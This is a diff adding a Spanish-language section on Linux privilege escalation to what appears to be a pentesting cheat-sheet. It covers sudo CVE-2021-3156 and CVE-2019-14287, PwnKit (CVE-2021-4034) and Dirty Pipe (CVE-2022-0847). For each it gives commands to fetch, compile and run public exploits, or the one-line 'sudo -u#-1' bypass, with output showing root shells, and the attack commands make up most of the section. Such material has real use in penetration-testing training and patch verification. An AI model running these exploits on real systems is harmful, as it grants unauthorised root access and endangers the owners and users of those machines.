@@ -3206,6 +3206,142 @@ Los miembros del grupo `adm` pueden leer todos los archivos de logs ubicados en 
 
 Los miembros de este grupo tiene acceso completo dentro `/dev` como `/dev/sda`.
 
+##### CVE-2021-3156
+
+Una de las vulnerabilidades más recientes de sudo, CVE-2021-3156, se basa en un desbordamiento de búfer basado en el heap. Esto afectó a las siguientes versiones de sudo:
+
+- 1.8.31 - Ubuntu 20.04
+- 1.8.27 - Debian 10
+- 1.9.2 - Fedora 33
+- y otros
+
+Existe una [PoC](https://github.com/blasty/CVE-2021-3156) pública que se puede utilizar para esto.
+
+```bash
+git clone https://github.com/blasty/CVE-2021-3156.git
+cd CVE-2021-3156
+make
+cat /etc/lsb-release
+./sudo-hax-me-a-sandwich <target>
+```
+
+##### Bypass de Políticas de Sudo (CVE-2019-14287)
+
+En 2019 se descubrió una vulnerabilidad crítica que afectaba a todas las versiones de Sudo anteriores a la 1.8.28, permitiendo la escalada de privilegios mediante un comando sencillo. Identificada como [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/), esta vulnerabilidad solo requería un único requisito: que el archivo /etc/sudoers permitiera a un usuario ejecutar un comando específico.
+
+Ejemplo Práctico
+
+Al verificar los permisos con `sudo -l`, observamos que el usuario `elliot` tiene permitido ejecutar el comando `/usr/bin/id` en el sistema:
+
+```bash
+elliot@debian:~$ sudo -l
+[sudo] password for elliot: **********
+
+User elliot may run the following commands on Mrrobot:
+    ALL=(ALL) /usr/bin/id
+```
+
+###### Explicación de la Vulnerabilidad
+
+Sudo permite ejecutar comandos con IDs de usuario específicos, otorgando los privilegios del usuario asociado a dicho ID. Por ejemplo, el ID del usuario `elliot` se puede obtener del archivo `/etc/passwd`:
+
+```bash
+elliot@debian:~$ cat /etc/passwd | grep elliot
+elliot:x:1000:1000:elliot,,,:/home/elliot:/bin/bash
+```
+
+Aquí, el ID de `elliot` es **1000**. Sin embargo, la vulnerabilidad radica en que, si se ingresa un ID negativo (como `-1`), Sudo lo interpreta como **0** (el ID de **root**). Esto permite obtener una shell con privilegios de root de manera inmediata:
+
+```bash
+elliot@debian2:~$ sudo -u#-1 id
+
+root@debian:/home/elliot# id
+uid=0(root) gid=1000(elliot) groups=1000(elliot)
+```
+
+###### Impacto
+
+Este fallo permitía a cualquier usuario con permisos limitados en `/etc/sudoers` convertirse en root sin autenticación adicional, explotando un error en el manejo de IDs de usuario. La corrección en Sudo `1.8.28` invalidó esta técnica al bloquear el uso de IDs negativos.
+
+##### CVE-2021-4034 / PwnKit
+
+Se descubrió una grave vulnerabilidad de corrupción de memoria en la herramienta pkexec, identificada como CVE-2021-4034 y denominada PwnKit. Este fallo permitía la escalada de privilegios y permaneció oculto durante más de diez años, sin que se pueda determinar con exactitud cuándo fue explotado por primera vez. Finalmente, fue revelado públicamente en noviembre de 2021 y corregido dos meses después.
+Explotación
+
+Para aprovechar esta vulnerabilidad, es necesario:
+
+- Descargar un Proof of Concept (PoC) diseñado para el ataque.
+- Compilarlo directamente en el sistema objetivo o en una réplica del entorno vulnerable.
+
+```bash
+elliot@debian:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
+elliot@debian:~$ cd CVE-2021-4034
+elliot@debian:~$ gcc cve-2021-4034-poc.c -o poc
+```
+
+Una vez compilado el código, podemos ejecutarlo sin más. Obteniendo una shell como `root`.
+
+```bash
+elliot@debian:~$ ./poc
+
+# id
+
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+##### Dirty Pipe (CVE-2022-0847)
+
+La vulnerabilidad [Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)) en el kernel de Linux permite escribir en archivos privilegiados del usuario root sin autorización. Técnicamente, es similar a la vulnerabilidad [Dirty Cow (2016)](https://dirtycow.ninja/) y afecta a los kernels desde la versión `5.8` hasta la `5.17`.
+
+###### Impacto:
+
+Permite a un usuario con solo permisos de lectura sobre un archivo modificarlo arbitrariamente.
+
+También afecta a dispositivos Android, donde aplicaciones maliciosas (ejecutándose con permisos de usuario) podrían aprovecharla para tomar el control del dispositivo.
+
+###### Fundamento técnico:
+La vulnerabilidad explota el manejo incorrecto de pipes (tuberías), un mecanismo de comunicación unidireccional entre procesos en sistemas Unix. Por ejemplo, podría usarse para:
+
+- Modificar /etc/passwd y eliminar la contraseña de root, permitiendo acceso con su sin autenticación.
+
+- Sobrescribir binarios críticos o configuraciones del sistema.
+
+###### Explotación:
+
+- Descargar un Proof of Concept ([PoC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)).
+
+- Compilarlo y ejecutarlo en el sistema objetivo (o una réplica vulnerable).
+
+```bash
+elliot@debian:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+elliot@debian:~$ cd CVE-2022-0847-DirtyPipe-Exploits
+elliot@debian:~$ bash compile.sh
+elliot@debian:~$ ./exploit-1
+Backing up /etc/passwd to /tmp/passwd.bak ...
+Setting root password to "piped"...
+Password: Restoring /etc/passwd from /tmp/passwd.bak...
+Done! Popping shell... (run commands now)
+
+# id
+
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Con la ayuda de la segunda versión del exploit (`exploit-2`), podemos ejecutar binarios SUID con privilegios de root.
+
+```bash
+elliot@debian:~$ ./exploit-2 /usr/bin/sudo
+
+[+] hijacking suid binary..
+[+] dropping suid shell..
+[+] restoring suid binary..
+[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
+
+# id
+
+uid=0(root) gid=0(root) groups=0(root)
+```
+
 ##  11. <a name='active-directory'></a>Active Directory
 
 ###  11.1. <a name='powershell-para-gestionar-active-directory'></a>PowerShell para gestionar Active Directory
